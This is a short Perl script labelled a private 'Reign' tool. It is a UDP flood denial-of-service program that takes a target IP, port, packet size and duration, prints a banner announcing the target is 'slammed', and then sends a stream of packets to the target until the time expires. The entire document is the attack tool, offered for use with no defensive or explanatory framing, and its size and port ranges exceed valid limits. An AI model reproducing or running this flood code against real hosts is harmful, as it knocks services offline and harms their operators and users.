###
# Private Script for Reign - Made By Long.Inetger
###

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$endtime = time() + ($time ? $time : 100);
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";

socket(flood, PF_INET, SOCK_DGRAM, 17);
print BOLD RED<<EOTEXT;
    ______        _               
    | ___ \      (_)              
    | |_/ /  ___  _   __ _  _ __  
    |    /  / _ \| | / _` || '_ \ 
    | |\ \ |  __/| || (_| || | | |
    \_| \_| \___||_| \__, ||_| |_|
                      __/ |       
                     |___/  

	Reign Slammed $ip
	For $time Seconds
EOTEXT
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
  send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($pport,
$iaddr));}